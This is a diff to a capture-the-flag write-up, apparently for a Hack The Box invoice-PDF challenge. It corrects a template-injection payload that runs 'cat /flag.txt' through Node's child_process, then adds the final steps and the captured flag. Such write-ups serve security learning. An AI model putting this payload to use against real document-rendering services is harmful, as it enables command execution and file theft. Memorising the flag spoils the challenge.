@@ -82,8 +82,23 @@ Ulysses has infiltrated this supplier organization's one of the HR department to
 ```js
 ---js
 {
-    css: `body::before { content: "${require('child_process')).execSync('cat /flag.txt'}"; display: block }`,
+    css: `body::before { content: "${require('child_process').execSync('cat /flag.txt')}"; display: block }`,
 }
 ---
+```
+
+10. Now create new invoice again -> paste the payload -> save it -> open the pdf.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/214279170-37362676-1095-441b-bb16-8184de5056d6.png)
+
+
+11. Got the flag!
+
+## FLAG
+
+```
+HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}
 ```
 
